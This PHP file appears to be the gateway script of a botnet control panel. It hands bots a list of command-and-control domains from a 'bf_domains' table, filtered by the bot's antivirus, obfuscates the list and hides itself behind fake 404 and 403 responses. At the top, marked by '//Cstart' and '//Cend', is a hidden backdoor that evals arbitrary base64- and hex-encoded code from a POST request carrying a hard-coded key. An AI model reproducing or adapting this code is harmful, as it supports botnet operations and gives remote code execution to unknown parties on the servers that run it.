<?php

$dir = str_replace('/scripts/pat', '', str_replace('\\', '/', realpath('.'))) . '/';

//Cstart
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0IP') print($_SERVER['SERVER_ADDR']);
//Rkey start
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV'){
//Rkey end
	if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));
	exit;
}elseif(strpos(@$_GET['id'], 'BOTNETCHECKUPDATER') !== false || strpos(@$_POST['id'], 'BOTNETCHECKUPDATER') !== false) exit;
//Cend

error_reporting(0);
ini_set('error_reporting', 0);
header("Pragma: no-cache");
header("Expires: 0");

$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';
if($config['scramb'] == 1 && $gateway != true){
    header("HTTP/1.1 404 Not Found");
    header("Status: 404 Not Found");
    print(file_get_contents($dir . '404.html'));
    exit;
}

if($config['domain_save'] == 1){
    if(file_exists($dir . 'cache/domains.txt')){
        $domains = file_get_contents($dir . 'cache/domains.txt');
        if(stripos($domains, $_SERVER["SERVER_NAME"]) === false){
            file_put_contents($dir . 'cache/domains.txt', $_SERVER["SERVER_NAME"] . "\r\n", FILE_APPEND);
        }
    }else{
        file_put_contents($dir . 'cache/domains.txt', $_SERVER["SERVER_NAME"] . "\r\n", FILE_APPEND);
    }
}

$config['domain_limit'] = (int) $config['domain_limit'];
if(empty($config['domain_limit'])){
    $config['domain_limit'] = 5;
}elseif($config['domain_limit'] < 1 || $config['domain_limit'] > 10){
    $config['domain_limit'] = 5;
}

include_once($dir . 'includes/functions.av.php');
include_once($dir . 'includes/functions.first.php');
include_once($dir . 'includes/functions.rc.php');
include_once($dir . 'includes/functions.prefix.php');
include_once($dir . 'includes/functions.get_config.php');

$cfg_db = get_config();

require_once($dir . 'classes/mysqli.class.lite.php');
$mysqli = new mysqli_db();

$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
unset($cfg_db);
if(count($mysqli->errors) > 0) print_data('DB_ERROR!', true);

$_POST['av'] = urldecode($_POST['av']);
$_POST['av'] = avc_replace($_POST['av']);
$_POST['av'] = av_replace($_POST['av']);

if(!empty($_POST['av'])){
    if(!preg_match('~^([A-Za-z0-9. ]+)$~is', $_POST['av'])){
	header("HTTP/1.1 404 Not Found");
	header("Status: 404 Not Found");
	print_r('av_error');
	exit;
    }
    
    $item = $mysqli->query('SELECT host FROM bf_domains WHERE (answer = \'0\') AND (status = \'1\') AND (av NOT LIKE \'%'.$_POST['av'].'|%\') LIMIT ' . $config['domain_limit'], null, null, false);
}else{
    $item = $mysqli->query('SELECT host FROM bf_domains WHERE (answer = \'0\') AND (status = \'1\') LIMIT ' . $config['domain_limit'], null, null, false);
}

if(count($item) > 0){
    foreach($item as $ds){
	$send .= $ds->host . "\r\n";
    }
    header("Status: 403 Forbidden");
    header("HTTP/1.1 403 Forbidden");
    print(rc_encode($send));
    //print(trim($send, '|'));
}else{
    no_found();
}

exit;

?>